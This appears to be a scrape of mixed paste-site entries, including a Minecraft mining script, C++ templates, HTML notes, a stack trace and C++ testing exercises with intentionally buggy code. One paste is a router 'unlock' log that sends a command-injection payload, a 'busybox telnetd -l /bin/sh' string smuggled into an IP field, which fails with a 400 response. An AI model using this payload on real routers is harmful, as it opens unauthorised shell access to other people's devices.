 * - Reads inputs, updates game state, and sets outputs.
 * - Only processes inputs if game is active (armed, not exploded).
 */
 
void loop() {
  int disarmState = HIGH;
  int wrongWireState = HIGH;
  
  // Read inputs and check if any wire is cut
  if (readInputs(disarmState, wrongWireState)) {
    updateGameState(disarmState, wrongWireState);
  }
  
  // Update outputs based on game state
  updateOutputs();
}"
a1rXJtyM,miner,giwdul,Lua,Monday 9th of June 2025 08:46:46 AM CDT,"-- CONFIG
local whitelist = {
  [""minecraft:coal_ore""] = true,
  [""minecraft:iron_ore""] = true,
  [""minecraft:gold_ore""] = true,
  [""minecraft:diamond_ore""] = true,
  [""minecraft:redstone_ore""] = true,
  [""minecraft:lapis_ore""] = true
}

local branchLength = 30
local branchesPerSide = 5
local fuelThreshold = 100

-- UTILS
function refuelIfNeeded()
  if turtle.getFuelLevel() < fuelThreshold then
    for i = 1, 16 do
      turtle.select(i)
      if turtle.refuel(1) then
        print(""Refueled"")
        break
      end
    end
  end
end

function inventoryFull()
  for i = 1, 16 do
    if turtle.getItemCount(i) == 0 then
      return false
    end
  end
  return true
end

function emptyInventory()
  print(""D√©chargement..."")
  for i = 1, 16 do
    turtle.select(i)
    turtle.drop()
  end
end

function isValuable()
  local success, data = turtle.inspect()
  if success and whitelist[data.name] then
    return true
  end
  return false
end

function digSafe()
  if turtle.detect() then
    local success, data = turtle.inspect()
    if data and data.name == ""minecraft:lava"" then
      print(""Lave d√©tect√©e, √©vit√©e."")
      return false
    end
    turtle.dig()
  end
  return true
end

function mineForward()
  if digSafe() then
    turtle.forward()
  end
end

-- MINING LOGIC
function mineBranch()
  for i = 1, branchLength do
    if inventoryFull() then
      goBack(i)
      emptyInventory()
      returnToBranch(i)
    end
    if isValuable() then
      turtle.dig()
    end
    mineForward()
    turtle.digUp()
    turtle.digDown()
  end
  -- Retour √† la galerie principale
  turtle.turnLeft()
  turtle.turnLeft()
  for i = 1, branchLength do
    turtle.forward()
  end
  turtle.turnRight()
end

function goBack(steps)
  turtle.turnLeft()
  turtle.turnLeft()
  for i = 1, steps do
    turtle.forward()
  end
  turtle.turnRight()
  turtle.turnRight()
end

function returnToBranch(steps)
  for i = 1, steps do
    mineForward()
  end
end

-- MAIN PROGRAM
refuelIfNeeded()

for side = 1, 2 do
  for b = 1, branchesPerSide do
    print(""Branche ""..b.."" c√¥t√© ""..side)
    turtle.turnRight()
    mineForward()
    turtle.turnLeft()
    mineBranch()
  end
  -- Changement de c√¥t√©
  turtle.turnLeft()
  turtle.turnLeft()
end

print(""Minage termin√©."")
"
HqseGqiX,Combinatorics Template,Abrar_Al_Samit,C++,Monday 9th of June 2025 08:20:34 AM CDT,"#include <bits/stdc++.h>
using namespace std;

template<int MOD>
struct modint {
    int val;

    modint(long long v = 0) {
        if (v < 0) v = v % MOD + MOD;
        if (v >= MOD) v %= MOD;
        val = v;
    }

    modint operator+ (const modint &other) const {
        int res = val + other.val;
        if (res >= MOD) res -= MOD;
        return modint(res);
    }

    modint operator- (const modint &other) const {
        int res = val - other.val;
        if (res < 0) res += MOD;
        return modint(res);
    }

    modint operator* (const modint &other) const {
        return modint((long long)val * other.val % MOD);
    }

    modint operator/ (const modint &other) const {
        return *this * other.inv();
    }

    modint pow(long long exp) const {
        modint base = *this, result = 1;
        while (exp) {
            if (exp & 1) result = result * base;
            base = base * base;
            exp >>= 1;
        }
        return result;
    }

    modint inv() const {
        return pow(MOD - 2);
    }

    modint& operator+= (const modint &other) { return *this = *this + other; }
    modint& operator-= (const modint &other) { return *this = *this - other; }
    modint& operator*= (const modint &other) { return *this = *this * other; }
    modint& operator/= (const modint &other) { return *this = *this / other; }

    friend ostream& operator<<(ostream &os, const modint &m) {
        return os << m.val;
    }
	friend istream& operator>>(istream &is, modint &m) {
        long long x; is >> x; m = modint(x);
        return is;
    }
};

const int nax = 2e5 + 10;
const int mod = 1e9 + 7;
using mint = modint<mod>;
#warning update constant values


mint fact[nax], invfact[nax];
void precompute() {
    fact[0] = invfact[0] = 1;
    for (int i = 1; i < nax; ++i) fact[i] = fact[i-1] * i;
    invfact[nax-1] = fact[nax-1].inv();
    for (int i = nax-2; i >= 1; --i) invfact[i] = invfact[i+1] * (i+1);
}
mint nCr(int n, int r) {
    if (r < 0 || r > n) return 0;
    return fact[n] * invfact[r] * invfact[n - r];
}

void PlayGround() {

}
int main() {
	ios_base::sync_with_stdio(0); cin.tie(0);
	int t; cin>>t;
	while(t--) PlayGround();
}
"
pGAYUfhB,Second Order Difference Array (ABC407F),Abrar_Al_Samit,C++,Monday 9th of June 2025 07:31:14 AM CDT,"#include <bits/stdc++.h>
using namespace std;

const int nax = 2e5 + 4;
int n, a[nax];
int L[nax], R[nax];
long long ans[nax];
void PlayGround() {
	cin>>n;
	for(int i=1; i<=n; ++i) {
		cin>>a[i];
	}

	int stk[n + 10] = {0}, top = 0;
	for(int i=1; i<=n; ++i) {
		while(top && a[stk[top]] <= a[i]) R[stk[top--]] = i;
		stk[++top] = i;
	}
	while(top) R[stk[top--]] = n+1;
	for(int i=n; i>0; --i) {
		while(top && a[stk[top]] < a[i]) L[stk[top--]] = i;
		stk[++top] = i;
	}


	//second order difference array works because the number of times a[i] 
	//gets added to each subarray length has the following pattern:
	//1 2 3 4 5 6 ... x x x x x x x-1 x-2 x-3 x-4 ... 3 2 1 0
	// in the first order difference array : 
	//1 1 1 1 1 1 ... 0 0 0 0 0 0 -1 -1 -1 -1 -1 ... -1 -1 -1 0 0 0 ... 
	//in the second order difference array : 
	//1 0 0 0 0 0 ... -1 0 0 0 0 0 -1 0 0 0 0 0 0 ... 0 0 0 0 1 0 0 0 ...

	for(int i=1; i<=n; ++i) {
		ans[1] += a[i];
		ans[i - L[i] + 1] -= a[i];
		ans[R[i] - i + 1] -= a[i];
		ans[R[i] - L[i] + 1] += a[i];
	} // now ans is the second order difference array of actual answer
	for(int i=1; i<=n; ++i) {
		ans[i] += ans[i-1];
	} // first order difference array
	for(int i=1; i<=n; ++i) {
		ans[i] += ans[i-1];
	} // actual ans

	for(int i=1; i<=n; ++i) {
		cout<<ans[i]<<'\n';
	}

}
int main() {
	int t = 1;
	while(t--)
		PlayGround();
}"
hy5YtYEr,Untitled,Claitonok,HTML,Monday 9th of June 2025 07:09:23 AM CDT,"A sem√¢ntica no HTML refere-se ao uso de elementos que possuem significados claros e espec√≠ficos, ajudando a estruturar o conte√∫do de forma mais compreens√≠vel tanto para humanos quanto para m√°quinas (como navegadores e motores de busca). Esses elementos descrevem o prop√≥sito do conte√∫do que envolvem, melhorando a acessibilidade e o SEO (Search Engine Optimization).
Exemplos de Elementos Sem√¢nticos no HTML:
Estrutura de P√°gina:
<header>: Representa o cabe√ßalho de uma p√°gina ou se√ß√£o.
<nav>: Define uma √°rea de navega√ß√£o, como menus.
<main>: Indica o conte√∫do principal da p√°gina.
<section>: Agrupa conte√∫dos relacionados dentro de uma p√°gina.
<article>: Representa um conte√∫do independente, como um post de blog ou not√≠cia.
<aside>: Usado para conte√∫dos relacionados, como barras laterais ou informa√ß√µes complementares.
<footer>: Define o rodap√© da p√°gina ou de uma se√ß√£o.
Texto e Conte√∫do:
<h1> a <h6>: T√≠tulos e subt√≠tulos, organizados por hierarquia.
<p>: Par√°grafos de texto.
<blockquote>: Cita√ß√µes em bloco.
<address>: Informa√ß√µes de contato.
<time>: Representa datas ou hor√°rios.
Tabelas e Listas:
<table>, <thead>, <tbody>, <tfoot>: Estrutura√ß√£o de tabelas.
<ul> e <ol>: Listas n√£o ordenadas e ordenadas.
<li>: Itens de lista.
Outros Elementos Sem√¢nticos:
<figure> e <figcaption>: Para imagens ou gr√°ficos com legendas.
<mark>: Destaca texto relevante.
<strong> e <em>: Para dar √™nfase ou import√¢ncia ao texto.
Benef√≠cios do Uso de HTML Sem√¢ntico:
Acessibilidade: Facilita a navega√ß√£o para leitores de tela e dispositivos assistivos.
SEO: Motores de busca entendem melhor o conte√∫do, melhorando o ranqueamento.
Manuten√ß√£o: C√≥digo mais organizado e f√°cil de entender para desenvolvedores.
Adotar boas pr√°ticas de sem√¢ntica √© essencial para criar p√°ginas web modernas, acess√≠veis e bem estruturadas!
"
mdKiNFBq,2025-06-09T15:08:08.599093,powerampache,PHP,Monday 9th of June 2025 07:08:09 AM CDT,"1.01-76 (76) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
S3hxAhyn,Untitled,njunwa1,Apache Log,Monday 9th of June 2025 06:44:18 AM CDT,"Connecting to router: 192.168.1.1
Using session ID: 77c3a3575455f65e03a21e4c7c4e917768e0c650ef0e2736dc7d97b7356e8ac8
StartInfo
Response: {""success"":true,""cmd"":207,  ....}

WAN Open successful (sync)
Response: {""success"":true,""cmd"":302,""message"":""""}

Starting Unlock command
Sending injection payload:
{
  ""method"": ""POST"",
  ""subcmd"": 6,
  ""success"": true,
  ""ip"": ""127.0.0.1;busybox telnetd -l /bin/sh"",
  ""cmd"": 172,
  ""sessionId"": ""77c3a3575455f65e03a21e4c7c4e917768e0c650ef0e2736dc7d97b7356e8ac8"",
  ""enabled"": ""1""
}
Request failed: 400 Bad Request
HTTP Response: <!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">

<html>

  <head>
    <meta http-equiv=""Content-type"" content=""text/html;charset=UTF-8"">
    <title>400 Bad Request</title>
  </head>

  <body bgcolor=""#cc9999"" text=""#000000"" link=""#2020ff"" vlink=""#4040cc"">

    <h4>400 Bad Request</h4>
Can't parse request!
    <hr>

    <address><a href=""http://www.acme.com/software/mini_httpd/""></a></address>

  </body>

</html>

‚úó HTTP request failed
"
e5hnf9bz,Untitled,kirzecy670,MySQL,Monday 9th of June 2025 06:23:26 AM CDT,"SELECT uid,
       ts,
       action,
       sessionNumber,
       addJson,
       JSONExtractInt(addJson, 'timestamp') AS timestamp,
       appVersion
FROM stat.funnelTrack
WHERE dt >= '2025-06-01'
  AND uid IN ('uw8bt35x40')
  AND action NOT IN ('default_price_group',
                     'app_theme_change',
                     'install_referrer_init',
                     'sensors',
                     'unlucky',
                     'notification_in_app_switcher',
                     'notifications_sound',
                     'firebase_info',
                     'load_product_prices_start',
                     'install_referrer_response',
                     'REFERRER',
                     'feature_disabled',
                     'load_product_prices_end',
                     'purchase_flow',
                     'appsflyer_attribution',
                     'fst_gmd_55626_quiz_basic',
                     'app_was_rolled',
                     'app_was_closed')
    -- AND action in ('full_register', 'profile_open', 'main_screen_open', 'open_first')
    AND action not like 'fst_gmd_%'
    AND action not like 'growth_gmd_%'
    AND action not like '%buy_screen%'
ORDER BY uid,
         ts DESC, timestamp DESC
LIMIT 5000;"
qye39BwG,dataNone,TestGuy1,JSON,Monday 9th of June 2025 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'f4b32588bb1b0a5a62c67ce0dcbe248ad8e17bd9b38ec80a65b81bc4b65b974a5e8a7217356c9d45cd24af369f74ad51b5cd294bb9eea677552dfe43e3550113656ada28962556ece147548cff2d07a82e9f81615ededd5e9141447ef03bfb548fa9daf8de9a5214f0e5170a7b68ec39402d7290ee08abbcfb2479c352d2ec14',
  otherdata: [
    '8789c99f0f2ae65448e2f6b26a9d2cb8',
    '199f708b61bac7219cca7df0a4c97c83',
    '147a9bbb502902c097dcaf672981ef69',
    '5b811f60a502d4616ed922c15c20137a',
    '3257104f84ced6a6c7044862d3ad93eb',
    '1a7b5b4c1657c2d028feadf681ec5c47',
    '76fb4fe0127e0e7d2f6a14f844589122',
    '6f5fe1be76bcd773c58ee4e80fee1be8'
  ]
}"
hGUZy8eQ,Pillole video 16,fcamuso,C#,Monday 9th of June 2025 05:39:50 AM CDT,"public static partial class StringExtensions
{
	public static string FirstUpper(this string str, bool OnlyFirst = false)
	 => str switch
	 {
		 [] => string.Empty,
		 [char single] => char.ToUpperInvariant(single).ToString(),
		 [char first, .. var rest] => char.ToUpperInvariant(first) + (OnlyFirst ? rest.ToLowerInvariant() : rest)
	 };

	public static string AllFirstUpper(this string str, bool OnlyFirst = false)
					=> string.Join(' ', str.Split(' ', StringSplitOptions.RemoveEmptyEntries).Select(e => e.FirstUpper(OnlyFirst)));

	public static string? EmptyToNull(this string str)
			=> string.IsNullOrWhiteSpace(str) ? null : str;

	public static string OnlyNumbers(this string str)
	 => new([.. str.Where(c => c >= '0' && c <= '9')]);

	public static string RemoveSpaces(this string str)
			=> new([.. str.Where(c => c != ' ')]);

	[return: NotNullIfNotNull(nameof(str))]
	public static string GetValueOrDefault(this string? str, string defaultValue, bool whiteSpaceAsEmpty = false)
			=> whiteSpaceAsEmpty ?
				 (string.IsNullOrWhiteSpace(str) ? defaultValue : str) :
				 (string.IsNullOrEmpty(str) ? defaultValue : str);

	public static bool IsEmail(this string value)
			=> EmailRegEx().Match(value).Success;

	[GeneratedRegex(""^([\\w-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([\\w-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)$"")]
	private static partial Regex EmailRegEx();
}"
t1SKeMa0,Search As Button,FanaticExplorer,CSS,Monday 9th of June 2025 05:35:46 AM CDT,"/**
* @name Search As Button
* @author Madeline, KrystalSkullOfficial
* @description Makes Search Icon a button.
* @version 3.0
*/

.search__97492:not(.open__97492)>.searchBar__97492 {
    width: 30px;
    background: transparent;
    border: none;
}

.search__97492:not(.open__97492) .iconLayout_fea832 {
    cursor: pointer;
}

.search__97492:not(.open__97492):hover .icon_fea832 {
    color: var(--icon-secondary);
}

.open__97492 .iconContainer_fea832 {
    top: -1px;
}

.iconContainer_fea832 {
    margin-bottom: -6px !important;
    width: 20px;
    height: 20px;
    left: -8px;
    color: var(--icon-tertiary);
}"
ghj7cKuh,Untitled,EdGr87,C#,Monday 9th of June 2025 04:02:39 AM CDT,"using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp.Syntax;

using System.Text;

namespace FontAliasGenerator {

    // Step 1: Mark this class as an incremental source generator
    [Generator]
    public class FontAliasGenerator : IIncrementalGenerator {
        // Step 2: Initialize the generator and set up an incremental syntax provider pipeline
        public void Initialize(IncrementalGeneratorInitializationContext context) {
            System.Diagnostics.Debug.WriteLine(""üöÄ FontAliasGenerator is initializing..."");

            var syntaxProvider = context.SyntaxProvider
                    .CreateSyntaxProvider((node, _) => IsMauiProgram(node), // Step 3: Identify MauiProgram class
                        (ctx, _) => ctx.SemanticModel.Compilation) // Step 4: Extract Compilation object
                    .Where(comp => comp is not null);

            // Step 5: Register the source output, generating code from extracted compilation data
            context.RegisterSourceOutput(syntaxProvider, GenerateCode);
        }

        // Step 6: Function to determine if a node belongs to MauiProgram.cs
        private bool IsMauiProgram(SyntaxNode node) {
            bool isMaui = node is CompilationUnitSyntax root &&
                root.DescendantNodes().OfType<ClassDeclarationSyntax>()
                    .Any(c => c.Identifier.Text == ""MauiProgram"");

            if(isMaui) {
                System.Diagnostics.Debug.WriteLine(""Scanning MauiProgram.cs for fonts..."");
            }

            return isMaui;
        }

        // Step 7: Main source generation logic‚Äîextract font aliases and add generated code
        private void GenerateCode(SourceProductionContext context, Compilation compilation) {

            context.ReportDiagnostic(Diagnostic.Create(
      new DiagnosticDescriptor(
          ""FONT001"",
          ""Debug"",
          ""‚úÖ Source Generator is executing!"",
          ""SourceGenerator"",
          DiagnosticSeverity.Info,
          true),
      Location.None));





            var fontAliases = ExtractFontAliases(compilation);
            context.AddSource(""FontAliases.g.cs"", GenerateFontAliasEnum(fontAliases));
        }

        // Step 8: Extract font alias names from AddFont method calls
        private List<string> ExtractFontAliases(Compilation compilation) {
            var fontAliases = new List<string>();

            // Step 9: Iterate over syntax trees to find MauiProgram.cs
            foreach(var syntaxTree in compilation.SyntaxTrees) {
                var root = syntaxTree.GetRoot();

                foreach(var invocation in root.DescendantNodes().OfType<InvocationExpressionSyntax>()) {
                    if(!invocation.Expression.ToString().Contains(""AddFont"")) {
                        continue; // Step 10: Filter only AddFont method calls
                    }

                    var arguments = invocation.ArgumentList.Arguments;
                    if(arguments.Count < 2) {
                        continue; // Step 11: Ensure we have both font file and alias
                    }

                    var semanticModel = compilation.GetSemanticModel(syntaxTree);
                    var aliasExpr = arguments[1].Expression;
                    var constValue = semanticModel.GetConstantValue(aliasExpr);

                    if(constValue.HasValue && constValue.Value is string alias) {
                        fontAliases.Add(alias); // Step 12: Extract and store alias
                        System.Diagnostics.Debug.WriteLine($""Detected font alias: {alias}""); // Debugging output
                    }
                }
            }

            return fontAliases;
        }

        // Step 13: Generate Enum for font aliases
        private string GenerateFontAliasEnum(List<string> fontAliases) {
            var sb = new StringBuilder();

            // Ensure all files in the project automatically use this alias
            sb.AppendLine(""global using WindowsPhoneTile.Enums;"");

            sb.AppendLine(""namespace WindowsPhoneTile.Enums"");
            sb.AppendLine(""{"");
            sb.AppendLine(""    public enum FontAliases"");
            sb.AppendLine(""    {"");

            foreach(var alias in fontAliases.Distinct()) {
                var safeName = Sanitize(alias); // Step 14: Clean up alias names for enums
                sb.AppendLine($""        {safeName},"");
            }

            sb.AppendLine(""    }"");
            sb.AppendLine(""}"");
            return sb.ToString();
        }

        // Step 15: Function to sanitize alias names for enum compatibility
        private string Sanitize(string alias) {
            var sanitized = new string([.. alias.Where(char.IsLetterOrDigit)]);
            return string.IsNullOrEmpty(sanitized) ? ""_"" : char.IsLetter(sanitized[0]) ? sanitized : ""_"" + sanitized;
        }
    }
}
"
g4UhbkDH,–ó–∞–¥–∞—á–∏ –Ω–∞ 9 –∏—é–Ω—è,kutuzzzov,C++,Monday 9th of June 2025 03:24:01 AM CDT,"–ó–∞–¥–∞—á–∞ 1 —Å —Ä–µ—à–µ–Ω–∏–µ–º:

#include <cassert>
#include <iostream>

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
int factorial(int n) {
    if (n < 0) {
        std::cerr << ""Error: Factorial is not defined for negative numbers\n"";
        return -1; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –æ—à–∏–±–æ—á–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
    }
    int result = 1;
    for (int i = 1; i <= n; ++i) {
        result *= i;
    }
    return result;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ç–µ—Å—Ç–æ–≤
void runTests() {
    std::cout << ""Running tests...\n"";

    // –¢–µ—Å—Ç 1: –ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ (0)
    assert(factorial(0) == 1); // –ü–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—é, 0! = 1

    // –¢–µ—Å—Ç 2: –ú–∞–ª–µ–Ω—å–∫–æ–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ
    assert(factorial(1) == 1);

    // –¢–µ—Å—Ç 3: –ë–æ–ª—å—à–æ–µ —á–∏—Å–ª–æ (–ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ)
    if (factorial(20) < 0) {
        std::cerr << ""Test failed: Overflow occurred\n"";
        assert(false);
    }

    // –¢–µ—Å—Ç 4: –û—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ
    if (factorial(-5) != -1) {
        std::cerr << ""Test failed: Negative input not handled correctly\n"";
        assert(false);
    }

    std::cout << ""All tests passed!\n"";
}

int main() {
    runTests();
    return 0;
}

–ó–∞–¥–∞—á–∞ 2 —Å —Ä–µ—à–µ–Ω–∏–µ–º:
#include <cassert>
#include <vector>
#include <iostream>

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
int findMax(const std::vector<int>& nums) {
    if (nums.empty()) {
        std::cerr << ""Error: Cannot find max in an empty array\n"";
        return -1; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –æ—à–∏–±–æ—á–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
    }
    int maxVal = nums[0];
    for (int num : nums) {
        if (num > maxVal) maxVal = num;
    }
    return maxVal;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ç–µ—Å—Ç–æ–≤
void runTests() {
    std::cout << ""Running tests...\n"";

    // –¢–µ—Å—Ç 1: –ü—É—Å—Ç–æ–π –º–∞—Å—Å–∏–≤
    if (findMax({}) != -1) {
        std::cerr << ""Test failed: Empty array not handled correctly\n"";
        assert(false);
    }

    // –¢–µ—Å—Ç 2: –ú–∞—Å—Å–∏–≤ —Å –æ–¥–Ω–∏–º —ç–ª–µ–º–µ–Ω—Ç–æ–º
    assert(findMax({42}) == 42);

    // –¢–µ—Å—Ç 3: –û–±—ã—á–Ω—ã–π –º–∞—Å—Å–∏–≤
    assert(findMax({1, 2, 3, -1, 5}) == 5);

    // –¢–µ—Å—Ç 4: –ú–∞—Å—Å–∏–≤ —Å –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º–∏ —á–∏—Å–ª–∞–º–∏
    assert(findMax({-10, -20, -5, -1}) == -1);

    std::cout << ""All tests passed!\n"";
}

int main() {
    runTests();
    return 0;
}

–ó–∞–¥–∞—á–∞ 3 —Å —Ä–µ—à–µ–Ω–∏–µ–º:
#include <cassert>
#include <string>
#include <iostream>

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
std::string reverseString(const std::string& str) {
    std::string reversed;
    for (int i = str.size() - 1; i >= 0; --i) {
        reversed += str[i];
    }
    return reversed;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ç–µ—Å—Ç–æ–≤
void runTests() {
    std::cout << ""Running tests...\n"";

    // –¢–µ—Å—Ç 1: –ü—É—Å—Ç–∞—è —Å—Ç—Ä–æ–∫–∞
    assert(reverseString("""") == """");

    // –¢–µ—Å—Ç 2: –°—Ç—Ä–æ–∫–∞ —Å –æ–¥–Ω–∏–º —Å–∏–º–≤–æ–ª–æ–º
    assert(reverseString(""a"") == ""a"");

    // –¢–µ—Å—Ç 3: –û–±—ã—á–Ω–∞—è —Å—Ç—Ä–æ–∫–∞
    assert(reverseString(""hello"") == ""olleh"");

    // –¢–µ—Å—Ç 4: –°—Ç—Ä–æ–∫–∞ —Å –ø—Ä–æ–±–µ–ª–∞–º–∏
    assert(reverseString(""a b c"") == ""c b a"");

    std::cout << ""All tests passed!\n"";
}

int main() {
    runTests();
    return 0;
}

–ó–∞–¥–∞—á–∞ 4 —Å —Ä–µ—à–µ–Ω–∏–µ–º:
#include <cassert>
#include <iostream>

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
bool isPrime(int n) {
    if (n <= 1) return false;
    for (int i = 2; i * i <= n; ++i) {
        if (n % i == 0) return false;
    }
    return true;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ç–µ—Å—Ç–æ–≤
void runTests() {
    std::cout << ""Running tests...\n"";

    // –¢–µ—Å—Ç 1: –ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ (0)
    assert(!isPrime(0));

    // –¢–µ—Å—Ç 2: –ï–¥–∏–Ω–∏—Ü–∞ (—Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π —Å–ª—É—á–∞–π)
    assert(!isPrime(1));

    // –¢–µ—Å—Ç 3: –ü–µ—Ä–≤–æ–µ –ø—Ä–æ—Å—Ç–æ–µ —á–∏—Å–ª–æ (2)
    assert(isPrime(2));

    // –¢–µ—Å—Ç 4: –ü—Ä–æ—Å—Ç–æ–µ —á–∏—Å–ª–æ
    assert(isPrime(17));

    // –¢–µ—Å—Ç 5: –°–æ—Å—Ç–∞–≤–Ω–æ–µ —á–∏—Å–ª–æ
    assert(!isPrime(4));

    std::cout << ""All tests passed!\n"";
}

int main() {
    runTests();
    return 0;
}


-------------------------------------------------------------------------------

–ó–∞–¥–∞—á–∏ –¥–ª—è —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ–π –ø—Ä–∞–∫—Ç–∏–∫–∏
–ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ã 20 –∑–∞–¥–∞—á —Å –≥–æ—Ç–æ–≤—ã–º –∫–æ–¥–æ–º, —Å–æ–¥–µ—Ä–∂–∞—â–∏–º –æ—à–∏–±–∫–∏. –î–ª—è –∫–∞–∂–¥–æ–π –∑–∞–¥–∞—á–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è –Ω–∞–ø–∏—Å–∞—Ç—å –º–æ–¥—É–ª—å–Ω—ã–µ —Ç–µ—Å—Ç—ã, —á—Ç–æ–±—ã –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫–∏.

–ó–∞–¥–∞—á–∞ 1: –°—É–º–º–∞ –¥–≤—É—Ö —á–∏—Å–µ–ª

int sum(int a, int b) {
    return a - b; // –û—à–∏–±–∫–∞: –≤–º–µ—Å—Ç–æ —Å–ª–æ–∂–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤—ã—á–∏—Ç–∞–Ω–∏–µ
}

–ó–∞–¥–∞—á–∞ 2: –§–∞–∫—Ç–æ—Ä–∏–∞–ª

int factorial(int n) {
    if (n == 0) return 1;
    return n * factorial(n - 2); // –û—à–∏–±–∫–∞: —Ä–µ–∫—É—Ä—Å–∏—è –Ω–µ–≤–µ—Ä–Ω–∞
}

–ó–∞–¥–∞—á–∞ 3: –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø—Ä–æ—Å—Ç–æ–µ —á–∏—Å–ª–æ

bool isPrime(int n) {
    if (n <= 1) return false;
    for (int i = 2; i < n; ++i) {
        if (n % i == 0) return true; // –û—à–∏–±–∫–∞: –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å return false
    }
    return true;
}

–ó–∞–¥–∞—á–∞ 4: –ü–æ–∏—Å–∫ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞

int findMax(const std::vector<int>& nums) {
    if (nums.empty()) return 0; // –û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –ø—É—Å—Ç–æ–≥–æ –º–∞—Å—Å–∏–≤–∞
    int maxVal = nums[0];
    for (int num : nums) {
        if (num > maxVal) maxVal = num;
    }
    return maxVal;
}

–ó–∞–¥–∞—á–∞ 5: –ü–µ—Ä–µ–≤–æ—Ä–æ—Ç —Å—Ç—Ä–æ–∫–∏

std::string reverseString(const std::string& str) {
    std::string reversed;
    for (int i = str.size(); i >= 0; --i) { // –û—à–∏–±–∫–∞: –∏–Ω–¥–µ–∫—Å–∞—Ü–∏—è –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å size()
        reversed += str[i];
    }
    return reversed;
}

–ó–∞–¥–∞—á–∞ 6: –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø–∞–ª–∏–Ω–¥—Ä–æ–º

bool isPalindrome(const std::string& str) {
    int n = str.size();
    for (int i = 0; i < n / 2; ++i) {
        if (str[i] != str[n - i]) return false; // –û—à–∏–±–∫–∞: –∏–Ω–¥–µ–∫—Å–∞—Ü–∏—è
    }
    return true;
}

–ó–∞–¥–∞—á–∞ 7: –°–ª–æ–∂–µ–Ω–∏–µ —Å—Ç—Ä–æ–∫

std::string concatenate(const std::string& a, const std::string& b) {
    return a - b; // –û—à–∏–±–∫–∞: –æ–ø–µ—Ä–∞—Ç–æ—Ä ""-"" –Ω–µ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω –¥–ª—è —Å—Ç—Ä–æ–∫
}

–ó–∞–¥–∞—á–∞ 8: –í—ã—á–∏—Å–ª–µ–Ω–∏–µ —Å—Ä–µ–¥–Ω–µ–≥–æ

double average(const std::vector<int>& nums) {
    if (nums.empty()) return 0;
    double sum = 0;
    for (int num : nums) {
        sum += num;
    }
